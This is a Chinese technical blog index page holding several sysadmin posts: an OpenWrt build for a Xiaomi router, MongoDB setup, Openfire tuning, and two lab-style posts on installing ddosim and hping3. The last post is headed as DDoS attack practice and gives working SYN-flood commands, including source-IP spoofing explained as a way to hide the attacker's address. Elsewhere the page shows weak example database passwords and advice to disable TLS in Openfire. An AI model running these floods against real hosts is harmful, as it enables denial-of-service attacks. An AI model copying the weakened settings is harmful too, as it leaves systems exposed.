<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Vision 的空间">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="Vision 的空间">
<meta property="og:locale">
<meta property="article:author" content="Vision.Yi">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>Vision 的空间</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Vision 的空间</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/12/openwrt_build_xiaomir3p/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/03/12/openwrt_build_xiaomir3p/" class="post-title-link" itemprop="url">在centos 自行编译 R3P openwrt</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-03-12 16:04:56" itemprop="dateCreated datePublished" datetime="2020-03-12T16:04:56+08:00">2020-03-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-27 21:38:14" itemprop="dateModified" datetime="2020-12-27T21:38:14+08:00">2020-12-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>1. 安装组件</strong></p>
<pre><code>yum -y install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler</code></pre><p><strong>2. 下载源码</strong></p>
<pre><code>git clone https://github.com/coolsnowwolf/lede
cd lede</code></pre><p><strong>可选：添加passwall安装源</strong></p>
<pre><code>vim feeds.conf.default
#passwall源
src-git lienol https://github.com/Lienol/openwrt-package</code></pre><p><strong>3.build设定</strong></p>
<pre><code>make menuconfig 

#设置必要选项
Target System (MediaTecRalink MIPS)
Subtarget (MT7621based board)
Target Profile (XiaomiMi Router 3 Pro)

LuCI---&gt;  
    1.Collections  ---&gt;
        &lt;*&gt;luci................... LuCIinterface with Uhttpd as Webserver (default)
LuCI ---&gt;
    Modules---&gt;
        Translations  ---&gt;
            &lt;*&gt;Chinese (zh-cn)
#其他部分配置选项，请选择：
#添加luci应用
LuCI -&gt;Applications  —&gt; &lt;*&gt; luci-app-aria2……………………………… LuCI Support for aria2
LuCI -&gt;Applications  —&gt; &lt;*&gt; luci-app-ddns……………………… Dynamic DNS configuration module
LuCI -&gt;Applications  —&gt; &lt;*&gt; luci-app-samba……………….. Network Shares – Samba SMB/CIFSmodule
LuCI -&gt;Applications  —&gt; &lt;*&gt; luci-app-transmission…………………. LuCI Support forTransmission
#添加USB挂载
Base system —&gt; &lt;*&gt;block-mount   

#添加硬盘格式支持
Kernel modules —&gt; Filesystems —&gt; &lt;*&gt; kmod-fs-ext4 (移动硬盘EXT4格式选择)
Kernel modules —&gt; Filesystems —&gt; &lt;*&gt; kmod-fs-vfat(FAT16 / FAT32 格式 选择)
Kernel modules —&gt; Filesystems —&gt; &lt;*&gt; kmod-fs-ntfs (NTFS 格式 选择)

#添加USB相关支持
Kernel modules —&gt; USB Support —&gt; &lt;*&gt; kmod-usb-core.
Kernel modules —&gt; USB Support —&gt; &lt;*&gt; kmod-usb-ohci.
Kernel modules —&gt; USB Support —&gt; &lt;*&gt; kmod-usb-storage.
Kernel modules —&gt; USB Support —&gt; &lt;*&gt; kmod-usb-storage-extras.
Kernel modules —&gt; USB Support —&gt; &lt;*&gt; kmod-usb2.
Kernel modules —&gt; USB Support —&gt; &lt;*&gt; kmod-usb3.

#添加自动挂载工具
Utilities —&gt; Filesystem —&gt; &lt;*&gt; badblocks</code></pre><p><strong>3.开始编译</strong></p>
<pre><code>#先同步软件包(启动20个线程，加快下载，这样就不用等10个小时了，我用了50分钟下载完毕)：
make download  V=s -j20  
#开始编译(第一次编译，不启用多线程。二次编译时可以选-j4,这个考虑你的CPU支持的线程数)
make -j1 V=s</code></pre><p>错误：</p>
<pre><code>configure: error: you should not run configure as root (set FORCE_UNSAFE_CONFIGURE=1 in environment to bypass this check)</code></pre><p>解决方法A：</p>
<pre><code>sudo make FORCE_UNSAFE_CONFIGURE=1 -j1 V=s</code></pre><p>解决方法B：</p>
<pre><code>export FORCE_UNSAFE_CONFIGURE=1
source /etc/profile
然后：
su –root  # 切换到root账号
make V=99 # 编译</code></pre><p>错误：</p>
<pre><code>tar: This does not look like a tar archive</code></pre><p>解决方法：（删除不能解压的包重新运行make）</p>
<p><strong>4.刷机</strong></p>
<pre><code>#编译后的目录
/home/lede/bin/targets/ramips/mt7621</code></pre><h2 id="最终结果：变砖"><a href="#最终结果：变砖" class="headerlink" title="最终结果：变砖"></a><strong>最终结果：变砖</strong></h2><h1 id="ubuntu-build"><a href="#ubuntu-build" class="headerlink" title="ubuntu build"></a>ubuntu build</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils</span><br><span class="line"></span><br><span class="line"><span class="comment">#/usr/include/c++/7/utility:68: error: bits/c++config.h</span></span><br><span class="line">sudo apt-get install gcc-multilib g++ -multilib</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/11/centos_install_mongodb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/03/11/centos_install_mongodb/" class="post-title-link" itemprop="url">centOS 安装 mongodb</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-03-11 14:18:40" itemprop="dateCreated datePublished" datetime="2020-03-11T14:18:40+08:00">2020-03-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-06 10:53:02" itemprop="dateModified" datetime="2020-11-06T10:53:02+08:00">2020-11-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>1. 添加安装源</strong></p>
<pre><code>sudo vim /etc/yum.repos.d/mongodb-org-4.2.repo

[mongodb-org-4.2]
name=MongoDB Repository
baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/4.2/x86_64/
gpgcheck=1
enabled=1
gpgkey=https://www.mongodb.org/static/pgp/server-4.2.asc</code></pre><p>2.安装mongodb常用包</p>
<pre><code>sudo yum install -y mongodb-org</code></pre><p>移动数据库</p>
<pre><code>#复制数据库
rsync -av /var/lib/mongo /data/database/mongodb/
#备份旧数据库
sudo mv /var/lib/mongo /var/lib/mongo.bak</code></pre><p>如果运行数据库是提示没权限，可以进行授权</p>
<pre><code>#Change owner and group
sudo chown -R mongod:mongod /data/mongodb/mongo
#Change context
sudo chcon -R -u system_u -t mongod_var_lib_t /data/mongodb/mongo/</code></pre><p>3.修改数据库保存路径<br>    vim /etc/mongod.conf</p>
<pre><code>#启动安全验证
security:
    authorization: enabled</code></pre><p>初步化数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath /data/mongodb/master</span><br></pre></td></tr></table></figure>



<p>添加超级管理员</p>
<pre><code>mongo

use admin
db.createUser(
  &#123;
    user: &quot;xhadmin&quot;,
    pwd: &quot;abc123&quot;,
    roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125;, &quot;readWriteAnyDatabase&quot; ]
  &#125;
)


use admin
db.createUser(
  &#123;
    user: &quot;xhadmin&quot;,
    pwd: &quot;abc123&quot;,
    roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125;, &quot;readWriteAnyDatabase&quot; ]
  &#125;
)</code></pre><p>创建数据库用户</p>
<pre><code>use test
db.createUser(
  &#123;
    user: &quot;myTester&quot;,
    pwd: &quot;xyz123&quot;,
    roles: [ &#123; role: &quot;readWrite&quot;, db: &quot;test&quot; &#125;,
             &#123; role: &quot;read&quot;, db: &quot;reporting&quot; &#125; ]
  &#125;
)</code></pre><p>集群</p>
<pre><code>replication:
  oplogSizeMB: 20000
  replSetName: &quot;flygramway&quot;

config = &#123;
   &quot;_id&quot;:&quot;flygramway&quot;,
  &quot;members&quot;:[
    &#123;&quot;_id&quot;:0,&quot;host&quot;:&quot;10.148.0.51:27017&quot;, arbiterOnly:true&#125;,
    &#123;&quot;_id&quot;:1,&quot;host&quot;:&quot;10.148.0.52:27017&quot;&#125;,
    &#123;&quot;_id&quot;:2,&quot;host&quot;:&quot;10.148.0.53:27017&quot;&#125;
  ]
&#125;

rs.initiate(config) //初始化
rs.status()</code></pre><p>mongod增加keyFile</p>
<pre><code>openssl rand -base64 756 &gt; /data/key_file
chmod 400 /data/key_file</code></pre><p>key_file上传到其他mongod服务器上，修改mongod配置，一般是/etc/</p>
<pre><code>mongodb.conf
security:
  authorization: enabled
keyFile: /data/key_file</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.auth(&quot;xhadmin&quot;,&quot;abc123&quot;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wiredTiger:</span><br><span class="line">  engineConfig:</span><br><span class="line">    configString : cache_size=1024M</span><br></pre></td></tr></table></figure>

<p>安装步骤参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/">https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/19/openfireoptimization/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/19/openfireoptimization/" class="post-title-link" itemprop="url">openfire 优化</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-19 17:08:15 / 修改时间：20:17:30" itemprop="dateCreated datePublished" datetime="2020-02-19T17:08:15+08:00">2020-02-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>原来连接与登录共收发20条信息<br>修改后连接与登录共收发8条信息</p>
<p>1.[Server Settings]-&gt;[Registration &amp; Login]-&gt;[SASL Mechanisms]只保留[SCRAM-SHA-1]（暂时测试不确认是否有优化）<br>并且xmpp.client.tls.policy改为:disabled</p>
<ul>
<li>required 必需</li>
<li>optional 可选</li>
<li>disabled 关闭</li>
<li>legacyMode 一种要求连接立即加密的策略（与“必需”策略相反，它允许最初未加密的连接通过StartTLS加密。</li>
</ul>
<p>这样可以减少一次接收信息</p>
<pre><code>16:19:20 RECV (0): &lt;stream:features&gt;&lt;starttls xmlns=&quot;urn:ietf:params:xml:ns:xmpp-tls&quot;&gt;&lt;/starttls&gt;&lt;mechanisms xmlns=&quot;urn:ietf:params:xml:ns:xmpp-sasl&quot;&gt;&lt;mechanism&gt;PLAIN&lt;/mechanism&gt;&lt;mechanism&gt;SCRAM-SHA-1&lt;/mechanism&gt;&lt;mechanism&gt;CRAM-MD5&lt;/mechanism&gt;&lt;mechanism&gt;DIGEST-MD5&lt;/mechanism&gt;&lt;/mechanisms&gt;&lt;compression xmlns=&quot;http://jabber.org/features/compress&quot;&gt;&lt;method&gt;zlib&lt;/method&gt;&lt;/compression&gt;&lt;ver xmlns=&quot;urn:xmpp:features:rosterver&quot;/&gt;&lt;register xmlns=&quot;http://jabber.org/features/iq-register&quot;/&gt;&lt;c xmlns=&quot;http://jabber.org/protocol/caps&quot; hash=&quot;sha-1&quot; node=&quot;https://www.igniterealtime.org/projects/openfire/&quot; ver=&quot;RoQdsUcljslH4bMYE/tqetK2DQU=&quot;/&gt;&lt;/stream:features&gt;</code></pre><p>2.文本已经加密，禁用TLS</p>
<p>3.SaslMechanism使用”PLAIN”</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/17/openfireerror/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/17/openfireerror/" class="post-title-link" itemprop="url">openfire 常见错误</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-01-17 17:08:15 / 修改时间：20:37:34" itemprop="dateCreated datePublished" datetime="2020-01-17T17:08:15+08:00">2020-01-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>错误1:Closing session that seems to be stalled. Preventing OOM<br>作用：防止通道出现OOM<br>配置：session.stalled.cap 默认 5242880  改为 10485760</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/centos_install_ddosim/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/29/centos_install_ddosim/" class="post-title-link" itemprop="url">centOS 安装 ddosim</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-29 22:18:29" itemprop="dateCreated datePublished" datetime="2019-11-29T22:18:29+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-03 19:54:55" itemprop="dateModified" datetime="2021-06-03T19:54:55+08:00">2021-06-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li>DDOSIM源码下载</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.sourceforge.net/project/ddosim/ddosim-0.2.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>源码包编译</li>
</ol>
<p>顺次执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf ddosim-0.2.tar.gz</span><br><span class="line">cd ddosim</span><br><span class="line">yum groupinstall &#x27;Development Tools&#x27; //安装gcc等</span><br><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p> 通常会遇到问题1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">configure: error: libpcap (dev) is required for this program</span><br></pre></td></tr></table></figure>

<p> 执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install libpcap-devel -y</span><br></pre></td></tr></table></figure>

<p> 问题2：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">configure: error: libnet0 (dev) is required for this program</span><br></pre></td></tr></table></figure>

<p> 执行： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://linuxscriptshub.com/wp-content/uploads/file/libnet0-dev-1.0.2a-6.x86_64.rpm</span><br><span class="line">rpm -ivh --force libnet0-dev-1.0.2a-6.x86_64.rpm  </span><br><span class="line">//force是必须，否则报：conflicts with file from filesystem-3.2-21.el7.x86-64</span><br></pre></td></tr></table></figure>

<p>再次执行 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ddosim -d 10.120.1.53 -p 8080 -c 10 -r HTTP_INVALID -i ens33</span><br><span class="line">./ddosim -d 10.120.1.53 -p 8080 -c 0 -w 0 -t 10 -r HTTP_VALID -i ens33</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/centos_install_hping3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/29/centos_install_hping3/" class="post-title-link" itemprop="url">centOS 安装 ddosim</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-29 22:18:29" itemprop="dateCreated datePublished" datetime="2019-11-29T22:18:29+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-07 16:39:46" itemprop="dateModified" datetime="2021-06-07T16:39:46+08:00">2021-06-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li><p>linux下安装hping3软件和tcpdump如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install tcpdump yum install tcpdump -y</span><br><span class="line">#源码安装hping3#安装依赖</span><br><span class="line">yum install -y libpcap libpcap-devel tcl tcl-devel gcc</span><br><span class="line">wget http://www.hping.org/hping3-20051105.tar.gz</span><br><span class="line">tar -xzvf hping3-20051105.tar.gz &amp;&amp; cd hping3-20051105</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这里有几个安装问题需要注意下：</p>
<p>1，因为我的centos7虚机镜像是3.10.0-229.el7.x86_64，64位的操作系统，而bytesex.h没有对64位的支持，所以./configure时会报“build byteorder.c时出现如下错误”</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3c00d446c1c5c79aedacca8a025eebf6.png" alt="3c00d446c1c5c79aedacca8a025eebf6.png"></p>
<p>解决：在解压目录编辑bytesex.h，指定位置加上|| defined(<strong>x86_64</strong>)\</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim bytesex.h</span><br><span class="line">#在defined(__i386__) \后面加上下面这行|| defined(__x86_64__)\</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/e794494291549879b1eacddc0877e4b7.png" alt="e794494291549879b1eacddc0877e4b7.png"></p>
<p>2，报错libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory</p>
<p>这是因为安装pcap库后没做软链接，解决如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/include/pcap-bpf.h /usr/include/net/bpf.h</span><br></pre></td></tr></table></figure>

<p>3，报错Can’t install the man page: /usr/local/confd/man/man8 does not exist</p>
<p>解决：手动创建/usr/local/confd/man/man8目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /usr/local/man/man8</span><br><span class="line">#如果已经make install,还需要执行下面三句才能重新</span><br><span class="line">make install</span><br><span class="line">rm -rf /usr/sbin/hping3</span><br><span class="line">rm -rf /usr/sbin/hping</span><br><span class="line">rm -rf /usr/sbin/hping2</span><br><span class="line">#最后执行make install</span><br></pre></td></tr></table></figure>

<p>如上解决完，执行hping3 -help，如下图，代表软件已经安装成功</p>
<p>三，DDoS攻击实践</p>
<p>1，在攻击源，也就是我的虚拟机端输入如下命令，这里两个命令唯一的区别是–rand-source参数，目标机器会看到一堆ip，不能定位你的实际IP。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 5000 -d 150 -S -w 64 -p 8080 --flood 10.120.1.53</span><br><span class="line">hping3 -c 5000 -d 150 -S -w 64 -p 8080 --flood --rand-source 10.120.1.53</span><br><span class="line">#命令解释-c：发送数据包的个数-d：每个数据包的大小-S：发送SYN数据包-w：TCP window大小-p：目标端口，你可以指定任意端口-flood：尽可能快的发送数据包-rand-source：使用随机的IP地址，目标机器看到一堆ip，不能定位你的实际IP；也可以使用-a或-spoof隐藏主机名</span><br></pre></td></tr></table></figure>

<p>实际观察下两个命令的效果</p>
<p>(1)hping3 -c 5000 -d 150 -S -w 64 -p 80 –flood 192.168.1.114</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c09580a718aa5b1886bc0c6e948fb433.png" alt="c09580a718aa5b1886bc0c6e948fb433.png"></p>
<p>打开winshake，查看抓包情况</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/18051fdaac3c5a3d775939718ca92409.png" alt="18051fdaac3c5a3d775939718ca92409.png"></p>
<p>(2)hping3 -c 5000 -d 150 -S -w 64 -p 80 –flood –rand-source 192.168.1.114</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3cb4f2d7a3ea865e51fff92a11b25775.png" alt="3cb4f2d7a3ea865e51fff92a11b25775.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e9d4ca14ac1c0999076cbf0d67cef9b2.png" alt="e9d4ca14ac1c0999076cbf0d67cef9b2.png"></p>
<p>可以看出，攻击者ip已经被隐藏</p>
<p>四，ddos攻击预防</p>
<p>小编认为，想完全防御住ddos的攻击并不现实的，不过我们可以做到如下几点来有限的限制ddos攻击的损害</p>
<p>1，尽量避免NAT的使用</p>
<p>2，充足的网络带宽保证 </p>
